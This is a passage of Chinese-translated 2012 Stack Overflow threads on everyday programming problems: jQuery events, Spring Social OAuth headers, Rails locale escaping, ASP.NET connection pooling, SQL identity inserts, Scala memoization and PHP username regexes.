是否有任何可靠的跨浏览器方法来确定单击事件是否由于直接用户操作而触发（他们实际上单击了元素）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T20:51:57.693

在 Chrome、Firefox 和 Opera 中，您可以使用`Event.detail`属性，如果它不是由`initUIEvent()`.

```
element.addEventListener('click', clickHandler, false);
function clickHandler (e) {
    if(e.detail > 0) {
        /* 1 = user click */
    } else {
        /* 0 = JS click */
    }
    return;
} 
```

不幸的是，在 IE9 中的两种情况下都`e.detail`返回`1`（并且在较旧的 IE 中根本不起作用）。看来，事件属性在 IE 中都是完全相同的（IE<9 包括，10 我不知道），尽管点击事件的来源。

# facebook - 基于 Facebook 标头的身份验证不起作用

> ID：12429511
> 
> 赞同：1
> 
> 时间：2012-09-14T17:48:08.493
> 
> 标签：facebook, oauth, spring-social

我正在使用 Spring Social 来尝试获取 Facebook 朋友及其位置的列表。据我所知，Spring Social 将访问令牌放入 HTTP 请求标头中，如下所示：

```
Authorization: OAuth AAAFDa6Gl4usBAJH4... 
```

而不是将其作为 access_token 参数附加到 URL。因此，请求只返回基本信息，不包括位置数据。我可以看出标头中的访问令牌是有效的，因为如果我手动将其包含在 GET 请求中，则将返回完整的数据集，包括位置。

有人以前见过这个问题，可以让我知道问题是什么吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-15T21:11:39.420

您是正确的，Spring Social 将访问令牌放在 Authorization 标头中（根据 OAuth 2 规范的草案 10）。现在，这可能应该使用最近草稿中的“Bearer”令牌格式，但过去几天我一直在使用 Spring Social Facebook 来做你想做的事情——获取用户的朋友- 它一直工作正常。

Facebook 的文档似乎比 Authorization 标头更重视 access_token 查询参数，但他们的 API 支持（总是有）。因此，假设给定的令牌被授予查看用户朋友的权限，它应该可以工作。

事实上，我只是再次确认了这一点：首先，我使用了 Spring Social Showcase（https://github.com/SpringSource/spring-social-samples/tree/master/spring-social-showcase），连接到 Facebook，然后点击左侧菜单中的“好友”列表。有效。我还获得了一个有效的访问令牌，将我的浏览器指向[https://graph.facebook.com/me/friends](https://graph.facebook.com/me/friends)并使用我的浏览器的 Modify Headers 插件将 Authorization 标头设置为“OAuth {my token}”，它也工作。

您有没有尝试过使用 Spring Social Showcase（在后台使用 Spring Social Facebook）？想知道你是否在那里面临同样的问题。

但是感谢您提出这个问题，因为它提醒我需要继续更新标题以使用“Bearer”而不是“OAuth”（我也确认它可以工作）。

# jquery - 显示一个 div 隐藏另一个

> ID：12429517
> 
> 赞同：0
> 
> 时间：2012-09-14T17:48:25.757
> 
> 标签：jquery, hide, addclass, removeclass

我确定这个话题之前已经提出过，但这里有。我的尝试是隐藏一个 div 并用它的对应项替换它。同样，我需要向一个项目添加一个类，同时从另一个项目中删除一个类。这很简单，我敢肯定。谢谢

```
 <script type="text/javascript">
     $(document).ready(function() {
      $('.form_sub').hide();
      });
       </script>
      <script type="text/javascript">
    $('a.theader_t').click(function(){
      $('.form_header').show();
      $('.form_sub').hide();
      $('.theader').addClass('active');
      $('sub_theader').removeClass('active');
    });
    </script>
     <script type="text/javascript">
    $('.sub_theader_t').click(function){
     $('.form_header').hide();
      $('.form_sub').show();
       $('.theader').removeClass('active');
      $('sub_theader').addClass('active');
     });
    </script> 
```

我很抱歉没有问这个问题。第一个功能有效，最后两个根本不起作用。我希望 a.theader_t 在添加活动类时显示 .form_header，但如果适用，则从 sub_theader_t 中获取活动。再次感谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T17:56:41.087

其他两个功能没有进入

```
$(document).ready(function() { }); 
```

第三个函数有错误

```
$('.sub_theader_t').click(function){ to 

$('.sub_theader_t').click(function(){ 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T17:59:21.773

您似乎要在这里结束脚本...

```
<script type="text/javascript">
     $(document).ready(function() {
        $('.form_sub').hide();
      });
 </script> 
```

这些事件不在**Document.Ready**下.. 进行此修改，它应该可以正常工作.. 还请确保使用 .on() 委托您的事件

```
< script type = "text/javascript" > $(document).ready(function() {
    $('.form_sub').hide();

    $('a.theader_t').on('click',function() {
        $('.form_header').show();
        $('.form_sub').hide();
        $('.theader').addClass('active');
        $('.sub_theader').removeClass('active');
    });

    $('.sub_theader_t').on('click' ,function) {
        $('.form_header').hide();
        $('.form_sub').show();
        $('.theader').removeClass('active');
        $('.sub_theader').addClass('active');
    });
< /script>​​​​​ 
```

# ruby-on-rails - 语言环境之谜中的撇号

> ID：12429518
> 
> 赞同：0
> 
> 时间：2012-09-14T17:48:26.863
> 
> 标签：ruby-on-rails, ruby-on-rails-3

我的 Rails 3 应用程序包含类似于以下的语言环境（为便于阅读而缩短）：

```
fr:
  mailer:
    apology: "... pour l'utilisation de ..." 
```

此语言环境字符串用于文本邮件模板，例如whatever.text.erb：

```
<%= t(:'mailer.apology') %> 
```

然而，创建的邮件将撇号替换为它的 HTML 实体：

```
... pour l&#x27;utilisation de ... 
```

我找不到任何有用的选项`I18n#translate`，有人知道解决方案吗？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T19:28:49.743

自己想出来 - 这是一个错误： [https ://github.com/rails/rails/pull/6943](https://github.com/rails/rails/pull/6943)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T18:17:45.437

我猜这是因为 Rails 的模板渲染器会自动转义内容。您是否尝试过将输出标记为 html 安全？例如

```
<%= t('mailer.apology').html_safe %> 
```

假设您不希望在您的语言环境中有危险内容；）

# asp.net - 使用 ASP.NET 和 Web 服务时最有效地获取 SQL 连接

> ID：12429519
> 
> 赞同：3
> 
> 时间：2012-09-14T17:48:36.153
> 
> 标签：asp.net, performance, web-services, sqlconnection

在 ASP.NET 中使用 Web 服务（我们专门使用 asmx 和 WCF）时，建立 SQL 连接的最佳方式是什么？现在，我正在为每个 Web 服务调用建立一个新的连接，但是当有成千上万的用户连接时，我不相信这会太有效。对此主题的任何见解将不胜感激。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-14T17:54:32.800

你正在做的是相当标准的。

假设您使用*相同*的连接字符串，则连接将来自连接池，这是获得连接的最有效方式。

只做所需的工作并在每次调用时关闭连接是一种很好的做法。

您可以做的一件事是*缓存*结果并为在缓存项的整个生命周期内不太可能导致数据更改的调用返回缓存结果。这将减少数据库调用。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-14T17:59:46.220

强烈建议您在使用完连接后始终关闭连接，以便将连接返回到池中。您可以使用 Connection 对象的 Close 或 Dispose 方法，或者通过在 C# 中的 using 语句中打开所有连接来执行此操作。未明确关闭的连接可能不会添加或返回到池中。

您应该在连接字符串中添加“Pooling = true”（并添加一个非零的“Min Pool Size”）。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-14T17:55:51.227

让提供者为您处理连接池；不要试图做得比它更好——你会失败。

使用默认连接设置，提供者将维护一个连接池。当您关闭/处置时，连接实际上只是释放到池中。它不一定是真正关闭的。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-14T17:56:46.483

默认情况下，SqlConnections 使用连接*池*，这将允许系统管理对先前连接对象的重用，而不是为每个请求真正创建“新”连接——达到池最大值。并且它是内置的，所以你不需要做任何事情来利用它。

编写自己的池/连接管理器充满危险，并导致各种邪恶，所以在我看来，允许系统管理池中的连接可能是你最好的选择。

# google-apps-script - 使用 Google Apps 脚本将值和格式复制到另一个 Google 电子表格

> ID：12429531
> 
> 赞同：1
> 
> 时间：2012-09-14T17:49:35.213
> 
> 标签：google-apps-script, google-sheets, google-spreadsheet-api

我有一张从 XML 提要中提取数据的工作表。我编写了一个脚本，然后根据特定列的内容将该一张纸分解​​为其他几张纸。这一切都很好。

我的问题是，在我从 XML 中提取数据并将其拆分为新工作表之前，我添加了一些列，进行了一些格式化等。然后当我将一行（使用 appendRow()）复制到新工作表时，我丢失了格式和公式。

我目前使用的代码是：

```
var datarange = template_sheet.getDataRange();

for (var i in dataRange) {
   workbook.getSheetByName(dataRange[i][6]).appendRow(dataRange[i]);

} 
```

有没有办法做我正在寻找的东西？还是我需要先将原始数据分解成单独的表格，然后遍历每张表格并进行格式化/公式？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-14T19:53:55.950

您应该使用 Range 对象的方法**copyTo(range, optAdvancedArgs)**。

```
var datarange = template_sheet.getDataRange();
for (var i in datarange)
  datarange[i].copyTo(
    workbook.getSheetByName(dataRange[i][6]).getRange(
      workbook.getSheetByName(dataRange[i][6]).getMaxRows()+1, 1)); 
```

应该做的伎俩

更清晰：

```
var datarange = template_sheet.getDataRange();
for (var i in datarange) {
  var sheet = workbook.getSheetByName(dataRange[i][6].getValue());
  datarange[i].copyTo(sheet.getRange(sheet.getMaxRows()+1, 1));
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2017-09-21T00:20:34.780

将包含值和格式的选项卡从一个选项卡复制到新选项卡：

```
function copyTab() {
  var ss, sourceSheet, sourceData, sourceDataRange, newSheetTab;

  ss = SpreadsheetApp.getActiveSpreadsheet();//Get active spreadsheet

  sourceSheet = ss.getSheetByName("Sheet1");//Get the source sheet tab
  newSheetTab = ss.insertSheet("New Sheet");//Create a new sheet tab

  sourceDataRange = sourceSheet.getDataRange();

  sourceDataRange.copyTo(newSheetTab.getRange(1, 1));//Copies the data from a range of 
  //cells to another range of cells. By default both the values and formatting are copied

} 
```

# xml - xslt 在第二个循环中获取错误的 xml 信息

> ID：12429533
> 
> 赞同：1
> 
> 时间：2012-09-14T17:49:38.580
> 
> 标签：xml, xslt, xml-parsing

我正在使用 xslt 将 xml 转换为不同的 xml。我用：

```
<xsl:template match="header">
<header>
        <order><xsl:value-of select="@order"/></order>
    <value><xsl:value-of select="../header"/></value>
</header>
</xsl:template> 
```

获取标题中的信息。

原始头文件：

```
<header order="1">blah11111</header>
<header order="2">blah22222</header> 
```

当我应用模板时，我从中得到了什么：

```
<header>
   <order>1</order>
   <value>blah11111</value>
</header>
<header>
   <order>2</order>
   <value>blah11111</value>
</header> 
```

我想要的是：

```
<header>
   <order>1</order>
   <value>blah11111</value>
</header>
<header>
   <order>2</order>
   <value>blah22222</value>
</header> 
```

有什么想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T21:30:12.930

在 XSLT 1.0 中，当 xsl:value-of 选择多个节点时，它会输出第一个节点的值并忽略所有其他节点。这种行为很容易出错，因此在 XSLT 2.0 中将其更改为输出所有值 - 这不一定是您想要的，但至少它可以清楚地说明出了什么问题。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-14T17:55:46.450

第二`select`个`xsl:value-of`元素上的 是爬到父元素，然后再次下降以获取所有`header`元素；`xsl:value-of`然后忽略除第一个之外的所有内容。

如果您想要的不是第一个`header`的值，而是您当前正在处理的标头的值，那么您的`select`属性说错了。尝试

```
<value><xsl:value-of select="."/></value> 
```

# javascript - 从数据库中提取 Nivo 滑块图像时闪烁

> ID：12429536
> 
> 赞同：0
> 
> 时间：2012-09-14T17:49:52.757
> 
> 标签：javascript, jquery, html

我正在尝试将 Nivo Slider 与图像数据库一起使用。它可以工作，但图像无法正确加载。相反，它们会闪烁。似乎它们每次都在完全重新加载，而不仅仅是在初始加载时。这是一个奇怪的问题。

它在这个页面上：http: [//www.holyfamilyshorewood.org/](http://www.holyfamilyshorewood.org/)

其他人设置了数据库，所以我不完全确定如何解决这个问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T18:23:17.523

此问题仅出现在 Chrome 中。但是有一个解决方法。

说明适用于 IIS6，但我想它与 IIS7 基本相同。

1.  打开 IIS 并导航到网站中包含您遇到问题的图像的文件夹。右键单击它并选择属性：
2.  在对话框窗口中，选择 HTTP Headers 选项卡：
3.  勾选启用内容过期框。
4.  设置 Expire After 选项并将其设置为 30 分钟，或任何您喜欢的时间。
5.  按确定。

[这在这里讨论。](http://support.dev7studios.com/discussions/nivo-slider/561-flashing-before-transitions-in-mac-chrome)

# android - Android AsyncTask 抛出神秘的 RuntimeException

> ID：12429537
> 
> 赞同：1
> 
> 时间：2012-09-14T17:49:57.993
> 
> 标签：android

在极少数情况下，我在我的一个 AsyncTasks 中遇到了这个神秘的 RuntimeException。我有多个地方在我的应用程序中实现 AsyncTasks，但无论我如何深入研究这些错误，我似乎都无法获得有关为什么抛出此 RuntimeException 或它发生在哪个线程中的任何信息。基于“ completedAbruptly=true" 我猜异步任务中有一个未捕获的异常，但我什至不知道从哪里开始尝试找出......想法？谢谢！

![在此处输入图像描述](../Images/cfae030cab2ec57e61a1842ebdfee4e7.png)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-14T18:20:28.070

`completedAbruptly=true`当执行的任务抛出异常时发生。an 的任务`AsyncTask`是执行`doInBackground`方法。

我建议您将`doInBackground`代码包装到`try`/`catch`块中并让它打印发生的异常。

```
protected Void doInBackground(Void... params) {
    try {
        // ----------
        // do stuff
        return null;
        // ----------
    } catch (Throwable t) {
        Log.e("AsyncTask", "OMGCrash", t);
        // maybe throw it again
        throw new RuntimeException(t);
    }
} 
```

这应该告诉你这一切发生的原因。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-14T17:58:16.897

根据[源代码](http://www.java2s.com/Open-Source/Android/android-core/platform-libcore/java/util/concurrent/ThreadPoolExecutor.java.htm)，`completedAbruptly`是线程由于用户交互而结束的标志。我猜想在异步任务完成之前完成活动时会发生异常。放弃这种可能性应该是微不足道的：只需用无限循环替换您的 AsyncTask 之一，然后在模拟器上按“返回”。

# sql - SCOPE_IDENTITY() id 的冲突

> ID：12429545
> 
> 赞同：0
> 
> 时间：2012-09-14T17:50:10.813
> 
> 标签：sql, sql-server

我有 3 张桌子`UniversityReg`，`SupporterReg`& `Login`。如果大学或支持者在系统中注册，则一般详细信息会显示在他们的表格中，登录详细信息会显示在`Login`表格中。在这里我使用`scope_identity`.

当我保存支持者注册详细信息时出现错误。

错误

> 消息 515，第 16 级，状态 2，过程 SupporterReg_SP，第 16
> 行 列不允许空值。插入失败。
> 
> 消息 515，级别 16，状态 2，Procedure SupporterReg_SP，第 20
> 行 列不允许空值。插入失败。

UniversityReg SP

```
ALTER PROCEDURE [dbo].[UniversityReg_SP]
  (
@Username varchar(50),
@Password varchar(50),
@UniversityName varchar(50) ,
@GovernmentRegNo varchar(50) ,
@Country varchar(50) ,
@CreatedBy varchar(50)

    )
AS
DECLARE @LoginID int
INSERT INTO UniversityReg   (UniversityName,GovernmentRegNo,Country,CreatedBy,ShortCode)values(@UniversityName,@GovernmentRegNo,@Country,@CreatedBy,'UNI')

SET @LoginID = SCOPE_IDENTITY();

INSERT INTO Login values(@LoginID,@Username,@Password,'UNI')

RETURN 
```

支持者Reg_SP

```
CREATE PROCEDURE [dbo].[SupporterReg_SP]
   (
@UserName varchar(50),
@Password varchar(50),
@SupporterName varchar(50),
@University varchar(50) ,
@ContactNo varchar(50),
@Email varchar(50),
@StudentLocation varchar(50) 

       )

          AS
       DECLARE @LoginID int
        INSERT INTO   SupporterReg(SupporterName,University,ContactNo,Email,StudentLocation,ImagePath,ShortCode)V   alues(@SupporterName,@University,@ContactNo,@Email,@StudentLocation,'','SUP')

SET @LoginID = SCOPE_IDENTITY();

INSERT INTO Login values(@LoginID,@UserName,@Password,'SUP')

RETURN 
```

大学注册表

```
[UniversityId] [int] IDENTITY(1,1) NOT NULL,
[Username] [varchar](50) NULL,
[Password] [varchar](50) NULL,
[UniversityName] [varchar](50) NULL,
[GovernmentRegNo] [varchar](50) NULL,
[Country] [varchar](50) NULL,
[CreatedBy] [varchar](50) NULL,
[ShortCode] [varchar](50) NULL, 
```

登录表

```
[LoginID] [int] NOT NULL,
[UserName] [nvarchar](50) NOT NULL,
[Password] [nvarchar](50) NOT NULL,
[ShortCode] [nvarchar](50) NULL 
```

SupporterReg 表

```
[SupporterId] [int] NOT NULL,
[SupporterName] [varchar](50) NULL,
[University] [varchar](50) NULL,
[ContactNo] [varchar](50) NULL,
[Email] [varchar](50) NULL,
[StudentLocation] [varchar](50) NULL,
[ImagePath] [varchar](50) NULL,
[ShortCode] [varchar](50) NULL, 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T18:11:24.387

您的问题是您的过程试图将多个值插入 SupporterReg 表，但是您没有包含 SupporterID 列的值，该列已定义为 NOT NULL。

您可以将值与插入语句一起传递，或者调整表 DDL 使其成为 IDENTITY 列并为您填充该数据。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T20:45:28.937

你的设计是错误的。您不应该使用登录表中两个不同表中的 ID 作为登录 ID。这是一个在实践中无法工作的模型，因为两个表迟早会具有相同的 id，而您将不知道登录与哪个表相关。您的父子关系颠倒了。

正确的设计是先插入登录，使登录ID成为身份。然后插入到 UniversityReg 或 SupporterReg 的子表中。当您这样做时，您可以获得 FK 和参照完整性。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-14T18:03:17.030

在您的存储过程`@LoginID`中是 SupporterReg 或 UniversityReg 的 ID，而不是 Login

在登录中，您的 LoginID 列应定义为`int identity(1,1)`，并且您应在插入中指定列名

```
INSERT INTO Login (column, names, go here)
values(@LoginID,@UserName,@Password,'SUP') 
```

# java - AcharEngine 制作日期相关图

> ID：12429554
> 
> 赞同：1
> 
> 时间：2012-09-14T17:50:46.313
> 
> 标签：java, android, eclipse, achartengine

我正在尝试绘制以特定日期存储的动物的重量图。我有两个 vars 的重量等级，日期和重量。

这是我正在使用的代码。

```
else if (str.equals("Weight"))
    {
        mDbHelper.open();
        wtArray = mDbHelper.getWeight();
        mDbHelper.close();

       TimeSeries diaSeries = new TimeSeries("Weight");

        for ( int i =0; i <wtArray.size(); i++)
        {
           Weight wt = wtArray.get(i);
           diaSeries.add(wt.date, wt.weight);
        }

        XYMultipleSeriesDataset dataset = new XYMultipleSeriesDataset();
        dataset.addSeries(diaSeries);

        XYMultipleSeriesRenderer mrenderer = new XYMultipleSeriesRenderer();

        XYSeriesRenderer renderer = new XYSeriesRenderer();
        renderer.setColor(Color.RED);
        renderer.setPointStyle(PointStyle.DIAMOND);
        renderer.setFillPoints(true);
        mrenderer.addSeriesRenderer(renderer);

        graphLayout.addView(ChartFactory.getTimeChartView(this, dataset, mrenderer, "MM/dd/yyyy"));
    } 
```

这段代码的问题是，它从不在 x 轴上显示任何内容，也没有显示任何图形线。

其次，如果我想显示从特定日期到另一个日期的数据怎么办？比如从二月到三月等？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-15T05:35:47.047

我已经使用您的代码构建了一个示例来为我编译和运行。请参阅下面正确显示图表的代码。代码构建一个`Intent`，因此您必须更改最后一行来构建一个`View`.

因此，如果您确实确定您确实将数据放入模型中，那么您应该检查布局。您可能没有正确地将图表视图添加到您的布局中。

```
List<Date> wtArray = new ArrayList<Date>();
double[] weight = new double[] { 70, 71, 74, 73, 70, 71, 75, 76, 75, 73, 75, 73 };
for (int i = 0; i < 12; i++) {
  wtArray.add(new Date(108, i, 1));
}
TimeSeries diaSeries = new TimeSeries("Weight");

for (int i = 0; i < wtArray.size(); i++) {
  diaSeries.add(wtArray.get(i), weight[i]);
}

XYMultipleSeriesDataset dataset = new XYMultipleSeriesDataset();
dataset.addSeries(diaSeries);

XYMultipleSeriesRenderer mrenderer = new XYMultipleSeriesRenderer();

XYSeriesRenderer renderer = new XYSeriesRenderer();
renderer.setColor(Color.RED);
renderer.setPointStyle(PointStyle.DIAMOND);
renderer.setFillPoints(true);
mrenderer.addSeriesRenderer(renderer);

return ChartFactory.getTimeChartIntent(context, dataset, mrenderer, "MM/dd/yyyy"); 
```

# python - 具有多个线程的安全客观多人游戏状态

> ID：12429556
> 
> 赞同：2
> 
> 时间：2012-09-14T17:50:53.647
> 
> 标签：python, django, redis, multiplayer, gevent

我正在用 Python、gevent 和 django-socketio 构建一个多人纸牌游戏，我想知道保持事物状态的最佳方式，记住会有多个客户端同时连接并做事。

我使用 Redis 作为游戏中位的数据存储，顶部有光对象模型（Redisco at the mo）。

我担心如何防御竞争条件，从而保持游戏状态的安全，并与这么多试图同时做事的客户保持一致。我认为我的主要选择是：

(1) - 确保所有操作都是安全的，同时有多个客户端同时执行操作（例如，玩家只能与他们自己的玩家模型的某些属性进行交互，并且通过另一个线程或某些可以执行任何操作的东西存在一些客观的游戏状态否则。) (2) - 使用带有一些全局锁的队列来确保客户端操作都以一定的保证顺序发生，并且一个在下一个开始之前完成。

我正在使用 Python、Django、django-socketio、gevent，但认为这适用更广泛。

这是人们所说的“线程安全”吗？

我想理论上我认为我更喜欢（1）的想法，并且我认为我可以通过一次只修改一个 Redis 键或一组安全的原子操作来确保安全操作，但我想我要么需要扔掉 Redisco 模型，或者在保存和写入内容时要非常小心地理解。我认为这对我们中的几个人来说很好，但从长远来看，代码库中有更多人可能会很危险。

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T19:33:56.440

你已经很好地描述了你的选择。可能你需要结合这两种方法。

1.  确保您拥有尽可能少的共享状态。
2.  使用队列来修改任何共享状态。

# scala - Maps 中的“get”方法是否具有 Scala 中的默认值？

> ID：12429557
> 
> 赞同：2
> 
> 时间：2012-09-14T17:50:57.027
> 
> 标签：scala, map, scala-collections, memoization

浏览 Map.withDefault，我无法弄清楚“get”的定义位置。尽管 default 似乎很明显没有记忆[1](https://github.com/scala/scala/blob/v2.9.2/src/library/scala/collection/Map.scala#L51)，但似乎“get”的某些实现可以在幕后记忆。

基本上，我想知道的是，如果我有一个我只想做一次的计算，一个默认的地图会做很多次，还是只做一次？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T20:18:21.883

不是问题。很长一段时间以来，我一直在做一个非常相似的把戏。

```
scala> :paste
// Entering paste mode (ctrl-D to finish)

def someFunction ( s : String ) = {
  println("someFunction called")
  s.size
}
val someFunctionMemoized : String => Int
  = new collection.mutable.HashMap[String, Int] {
      override def default ( key : String )
        = {
          val value = someFunction(key)
          update(key, value)
          value
        }
    }

// Exiting paste mode, now interpreting.

someFunction: (s: String)Int
someFunctionMemoized: String => Int = Map()

scala> someFunctionMemoized("abc")
someFunction called
res0: Int = 3

scala> someFunctionMemoized("abc")
res1: Int = 3 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-14T17:57:07.997

问完这个问题后，我立即意识到我可以使用嵌入在我的函数中的 mutator 签入 repl。

```
scala> val map = new Map.WithDefault[String, String](Map(), {string => { println(string); string } } )
map: Map.WithDefault[String,String] = Map()

scala> map("key")
key
res5: String = key

scala> map("key")
key
res6: String = key

scala> import scala.collection.mutable
import scala.collection.mutable

scala> val mmap = new mutable.Map.WithDefault[String, String](mutable.Map(), {string => { println(string); string } } )
mmap: scala.collection.mutable.Map.WithDefault[String,String] = Map()

scala> mmap("key")
key
res7: String = key

scala> mmap("key")
key
res8: String = key 
```

所以答案是：不。自己滚。

# php - 我如何在 PHP 中“合并”这两个正则表达式？

> ID：12429561
> 
> 赞同：4
> 
> 时间：2012-09-14T17:51:17.933
> 
> 标签：php, regex, preg-match

我正在学习正则表达式，所以请放轻松！

**如果用户名不以`_`**（下划线）开头并且**仅包含单词字符**（字母、数字和下划线本身），则认为用户名有效：

```
namespace Gremo\ExtraValidationBundle\Validator\Constraints;

use Symfony\Component\Validator\Constraint;
use Symfony\Component\Validator\ConstraintValidator;

class UsernameValidator extends ConstraintValidator
{
    public function validate($value, Constraint $constraint)
    {
        // Violation if username starts with underscore
        if (preg_match('/^_', $value, $matches)) {
            $this->context->addViolation($constraint->message);
            return;
        }

        // Violation if username does not contain all word characters
        if (!preg_match('/^\w+$/', $value, $matches)) {
            $this->context->addViolation($constraint->message);
        }
    }
} 
```

为了**将它们合并到一个正则表达式**中，我尝试了以下方法：

```
^_+[^\w]+$ 
```

解读为：*如果以下划线开头（最终不止一个），并且如果后面至少有一个字符是不允许的（不是字母、数字或下划线），则添加违规*。例如，不适用于“_test”。

你能帮我理解我错在哪里吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-14T17:56:25.267

您可以在第二个正则表达式中添加一个否定的前瞻断言：

```
^(?!_)\w+$ 
```

这意味着，尝试匹配整个字符串，而不是它的任何部分。字符串不能以下划线开头，并且可以包含一个或多个单词字符。

[**看它工作**](http://www.rubular.com/r/4CaJPsJEBu)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-14T17:57:03.317

问题是[德摩根定律](http://en.wikipedia.org/wiki/De_Morgan%27s_laws)。*仅当它以一个或多个下划线开头并且***所有**后续字符都是非单词字符`^_+[^\w]+$`时才会匹配。如果它以下划线开头*或***任何**字符是非单词字符，则需要匹配。

 ******我认为在这种情况下，关注有效的用户名更简单：它们以非下划线的单词字符开头，所有剩余的字符都是单词字符。换句话说，有效的用户名由模式描述`^[^\W_]\w*$`。所以，你可以写：

```
if (! preg_match('/^[^\W_]\w*$/', $value, $matches)) { 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-14T17:59:12.090

简单的解决方案是这样的：

```
if (!preg_match('/^[a-zA-Z0-9]+$/', $value, $matches)) { 
```

你只想要`\w`组（包括下划线）但没有下划线，所以`[a-zA-Z0-9]`相当于`\w`但没有下划线。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-14T17:59:20.760

当然，有许多不同的方法可以做到这一点。我可能会考虑使用类似的东西`/^(?!_)[\w\d_]+/$`。

与锚（^ 和 $）结合的`[\w\d_]+`部分基本上断言整个字符串仅由这些字符组成。(?!_) 部分是一个否定的前瞻断言。这意味着检查下一个字符不是下划线。由于它就在 ^ 锚旁边，因此可以确保第一个字符不是下划线。******

# python - restructuredtext：对元数据使用指令

> ID：12429564
> 
> 赞同：1
> 
> 时间：2012-09-14T17:51:28.813
> 
> 标签：python, restructuredtext

我正在编写一个基于重组文本的简单网页生成器，我想将标签放入文档中，就像这样。

```
=====
Title
=====

:author: Me
:tags: foo, bar

Here we go ... 
```

我现在想要的：

*   拥有某种文档树
*   找到`tags`条目，阅读它，处理它（就像在命令行上打印标签），删除它并渲染剩余的树。

因此，我想编写兼容的重组文本，以防它使用与我的程序不同的东西进行编译。

有人可以给我一个提示吗？我在这里找到了这个[http://svn.python.org/projects/external/docutils-0.6/docutils/examples.py](http://svn.python.org/projects/external/docutils-0.6/docutils/examples.py)在`internals`方法中展示了如何获取文档（以及因此 dom 树），但这是最好的要走的路还是基于正则表达式的方法（查找行，删除它们）会容易得多？使用树也将涉及转换树→文档等。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T20:43:00.630

我认为我对这两个问题都有一个很好的解决方案。首先，发行版中的`core.py`文件`docutils`显示了如何获取 doctree 以及如何编写它（例如使用 html 编写器），请参阅`publish_from_doctree`和`publish_doctree`. 然后，有`docutils.nodes.SparseNodeVisitor`哪一个可以子类化和覆盖方法，例如`visit_field`以各种方式操作文档树。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-14T18:03:46.637

有一些工具可以为您做到这一点。请参阅[http://docutils.sourceforge.net/docs/user/links.html](http://docutils.sourceforge.net/docs/user/links.html)

# javascript - 使用 JQuery 切换属性

> ID：12429565
> 
> 赞同：0
> 
> 时间：2012-09-14T17:51:39.670
> 
> 标签：javascript, jquery, dom, attributes, attr

我有一个输入表，我可以在双击时激活和停用。现在这个输入已经预先填充了来自 DB 的一些数据。因为用户必须按下按钮才能在双击输入并更改后更新数据库，所以我想存储输入的值，以防用户决定在更改后单击另一个单元格而不按下按钮我然后可以替换原始未发送的值。我正在使用 jquery 来执行此 attr 切换以只读更改输入，但我对 jquery 的了解有限，无法实现我想要的。[这是一些示例代码](http://jsfiddle.net/PnSdC/)

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T18:09:48.397

如果我理解这个问题，您希望在用户修改数据之前存储数据，如果用户不保存他们所做的更改，则将数据带回。

如果我正确理解了这个问题，我会使用[$.data()](http://api.jquery.com/jQuery.data/)来维护旧值。它本质上允许您将键值对保留在 html 元素中，因此为输入保留字符串备份相当容易。将此添加到 dblClick 以备份值：

```
$input.data("backup", $input.val()); 
```

并添加它以将其恢复为原始值：

```
function backup ($input) {
  $input.val($input.data('backup'));
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-14T18:48:46.243

奇迹般有效 ..

每行（tr）都有自己的缓存变量

编辑一个输入时……它的初始值被缓存在它的父 tr 缓存变量中。如果编辑另一个输入，则第一个输入将恢复其原始值。

```
$(function(){
    // jQ 1.7 for on method
    $('table tr').data('bak',{$node:null, value:''}).on('dblclick', 'input[type="text"]', function(e){
        var $input = $(this),
            $tr = $input.closest('tr'),
            data = $tr.data('bak');
        // No input yet edited on this tr/line OR same
        if(! data.$node ){
            $input
                .toggleClass("active")                             
                .prop('readonly', false);
            $tr.data('bak',{$node:$input, value:$input.val()});                          
        } else if($input.attr('id') != data.$node.attr('id')){              
                data.$node
                    .toggleClass("active")
                    .prop('readonly', true);
                // restore initial value for the previous clicked input
                data.$node.val(data.value);
                // backup bak with the new input double clicked and it's value
                $input
                    .toggleClass("active")
                    .prop('readonly', false);
                $tr.data('bak',{$node:$input, value:$input.val()});
        }
        return false;
    });
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-14T18:07:20.067

不确定我是否完全理解你的问题。也许这样的功能应该满足您的需求：

```
function toggleReadonly(o, force) {
    if (force != undefined) { //Force state: true: readonly, false: modifiable
        if (force) o.attr('readonly', 'readonly');
        else o.removeAttr('readonly');
    } else { //Toggle current state
        if (o.attr('readonly') == undefined) o.attr('readonly', 'readonly');
        else o.removeAttr('readonly');
    }
}

//...
toggleReadonly($(this)); //simply toggle
toggleReadonly($(this), true); //set readonly
